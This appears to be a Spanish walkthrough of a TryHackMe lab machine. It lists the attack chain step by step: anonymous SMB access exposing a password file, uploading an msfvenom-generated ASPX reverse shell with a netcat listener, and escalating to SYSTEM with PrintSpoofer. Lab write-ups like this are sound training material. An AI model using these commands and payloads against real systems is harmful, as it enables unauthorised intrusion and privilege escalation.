---
layout: default
---

# MÃ¡quina REVELANT

## 1. Fase de Reconocimiento (EnumeraciÃ³n de Puertos)

En esta mÃ¡quina, el objetivo es realizar una auditorÃ­a de seguridad completa. Comenzamos lanzando un escaneo de puertos para identificar los servicios activos.

### Escaneo de Puertos (Nmap)

**Comando sugerido:**

Bash

```bash
nmap -sV -sC -O -Pn -p- 10.80.154.48<br>
```

![image.png](image.png)

## 2. EnumeraciÃ³n de Recursos Compartidos (SMB)

Siguiendo el walkthrough, el siguiente paso lÃ³gico es inspeccionar el servicio SMB para ver si podemos acceder a algÃºn archivo sin credenciales.

**Comando sugerido:**

Bash

```bash
smbclient -L //10.80.154.48/
```

> **Nota:** Si solicita contraseÃ±a, simplemente presiona **Enter** para intentar el acceso como invitado.
> 

![image.png](image%201.png)

## 3. Acceso y ExtracciÃ³n de Datos en SMB

Intentamos acceder al recurso `nt4wrksv` sin proporcionar contraseÃ±a (Anonymous Login).

**Comando de acceso:**

Bash

```bash
smbclient //10.80.154.48/nt4wrksv
```

### Contenido del recurso

Una vez dentro, listamos los archivos con el comando `ls`. Encontramos un archivo llamado:

- **`passwords.txt`**

![image.png](image%202.png)

**AcciÃ³n realizada:**
Se descargÃ³ el archivo a nuestra mÃ¡quina local para su anÃ¡lisis:

Bash

```bash
get passwords.txt
```

### AnÃ¡lisis de `passwords.txt`

Al abrir el archivo, encontramos dos cadenas codificadas en **Base64**. Procedemos a decodificarlas:

![image.png](image%203.png)

![image.png](image%204.png)

## 4. VerificaciÃ³n de Permisos de Escritura (SMB)

Para confirmar si el recurso compartido permite la subida de archivos (vector de RCE), se realizÃ³ una prueba de transferencia:

1. **CreaciÃ³n de archivo local:** `echo "test" > prueba.txt`
2. **ConexiÃ³n al Share:** `smbclient //10.80.154.48/nt4wrksv`
3. **Carga exitosa:** Se utilizÃ³ el comando `put prueba.txt` dentro de la sesiÃ³n de SMB.

**Resultado:** El servidor permitiÃ³ la subida del archivo, lo que confirma que podemos cargar scripts maliciosos (shells).

![image.png](image%205.png)

### ConfirmaciÃ³n del Punto de Entrada

- **Puerto identificado:** 49663.
- **URL de prueba:** `http://10.80.154.48:49663/nt4wrksv/prueba.txt`.
- **Resultado:** El navegador muestra exitosamente el contenido "test".

## 5. ObtenciÃ³n de Acceso Inicial (Reverse Shell)

Dado que el servidor es **Windows IIS**, utilizaremos un archivo de script de servidor de ASP.NET (`.aspx`) para obtener una shell reversa.

### GeneraciÃ³n del Payload

En tu terminal de Kali, genera el archivo malicioso con `msfvenom` (sustituye `<TU_IP_VPN>` por tu direcciÃ³n de TryHackMe):

Utilizamos `msfvenom` para crear una reverse shell en formato `.aspx` compatible con el servidor IIS:

Bash

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.225.50 LPORT=4444 -f aspx -o shell.aspx
```

![image.png](image%206.png)

### Paso 2: Carga del Script Malicioso

Nos conectamos nuevamente mediante `smbclient` y subimos el archivo al servidor:

Bash

```bash
smbclient //10.80.154.48/nt4wrksv<br>smb: \> put shell.aspx
```

![image.png](image%207.png)

### Paso 3: Escucha y EjecuciÃ³n

1. **Listener:** En la terminal de Kali, ponemos Netcat a la escucha:Bash
    
    ```bash
    nc -lvnp 4444
    ```
    
2. **Trigger:** Desde el navegador, accedemos a la ruta del archivo para forzar su ejecuciÃ³n:
`http://10.80.154.48:49663/nt4wrksv/shell.aspx`

![image.png](image%208.png)

### Paso 4: Acceso Inicial

La conexiÃ³n se recibe exitosamente. Al ejecutar `whoami`, confirmamos que tenemos una sesiÃ³n activa como:

> **User:** `iis apppool\defaultapppool`
> 

![image.png](image%209.png)

## 6. Escalada de Privilegios (EnumeraciÃ³n)

Ahora que estamos dentro, el objetivo es convertirnos en **SYSTEM**. El primer paso es revisar los privilegios asignados a nuestra cuenta de servicio actual.

**Comando ejecutado:**

DOS

`whoami /priv`

![image.png](image%2010.png)

**PreparaciÃ³n del Exploit (Local):**

1. Se descargÃ³ el binario `PrintSpoofer64.exe` desde el repositorio de GitHub de *itm4n*.

wget [https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)

**Transferencia de Herramientas:**

1. Se utilizÃ³ la sesiÃ³n de `smbclient` para transferir el ejecutable al directorio `nt4wrksv`.
2. Comando: `put PrintSpoofer64.exe`.

![image.png](image%2011.png)

Una vez que el comando `put` termine en Kali, vuelve a la ventana donde tienes la shell de Windows (la de Netcat) y haz lo siguiente:

1. **Confirma que ya aparece:**DOS
    
    `dir`
    

![image.png](image%2012.png)

h

1. **Ejecuta la escalada:**

DOS

`.\PrintSpoofer64.exe -i -c cmd`

![image.png](image%2013.png)
